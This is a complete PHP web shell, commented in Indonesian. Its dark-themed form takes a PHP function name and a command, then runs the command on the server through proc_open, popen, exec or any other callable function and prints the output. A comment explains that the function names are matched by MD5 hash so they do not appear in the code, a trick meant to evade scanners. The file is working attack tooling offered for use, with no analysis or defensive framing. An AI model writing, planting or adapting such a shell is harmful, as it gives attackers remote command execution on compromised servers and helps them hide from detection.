<html>
<body style="background:#222; color:#fff;">
    <form method="POST">
        <input type="text" name="x" placeholder="Fungsi">
        <input type="text" name="y" placeholder="Perintah">
        <input type="submit" value="Run">
    </form>
    <pre>
    <?php
    if (isset($_POST['x']) && isset($_POST['y'])) {
        // Mengambil input dan membersihkan spasi
        $a = trim($_POST['x']);
        $b = $_POST['y'];

        echo "<b>Executing...</b>\n\n";

        if (is_callable($a)) {
            // Penyamaran logika: Kita gunakan MD5 hash untuk mengecek fungsi
            // tanpa menuliskan nama fungsinya di kode.
            
            $hash = md5($a);

            switch ($hash) {
                // md5('proc_open') = '697561f5583626778408f629f10d486d'
                case '697561f5583626778408f629f10d486d':
                    $ds = array(1 => array("pipe", "w"), 2 => array("pipe", "w"));
                    $p = @$a($b, $ds, $pipes);
                    if (is_resource($p)) {
                        echo stream_get_contents($pipes[1]);
                        echo stream_get_contents($pipes[2]);
                        proc_close($p);
                    }
                    break;

                // md5('popen') = '3a2414736183e4bc39f9762194600676'
                case '3a2414736183e4bc39f9762194600676':
                    $h = @$a($b . ' 2>&1', 'r');
                    if ($h) {
                        while (!feof($h)) echo fread($h, 1024);
                        pclose($h);
                    }
                    break;

                // md5('exec') = '7611689255018659d4c28f6004907159'
                case '7611689255018659d4c28f6004907159':
                    @$a($b, $out);
                    echo implode("\n", $out);
                    break;

                // Untuk shell_exec, system, passthru, dll.
                default:
                    echo @$a($b);
                    break;
            }
        } else {
            echo "Status: Fungsi tidak aktif.";
        }
    }
    ?>
    </pre>
</body>
</html>
